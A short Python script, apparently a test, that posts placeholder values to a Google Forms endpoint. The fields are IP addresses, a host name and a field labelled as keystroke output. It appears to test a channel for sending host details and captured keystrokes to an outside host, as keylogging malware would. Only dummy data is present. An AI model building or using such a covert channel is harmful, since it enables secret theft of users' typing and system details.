#!/usr/bin/python3

import requests

url = "https://docs.google.com/forms/d/e/1FAIpQLSdX1isUEfIf3rI2efwZwkucW73HAvlPXuXqQJ4udzvlWg_d7w/formResponse"

data = {
	"entry.745369685": '255.255.255.255',
	"entry.1437673380": '255.255.255.255',
	"entry.904649455": 'Hostname',
	"entry.1598571516": 'Test-output-key-strokes',
}

try:
	result = requests.post(url, data)
	print(result)
except Exception as e:
	print('Error: ', str(e))
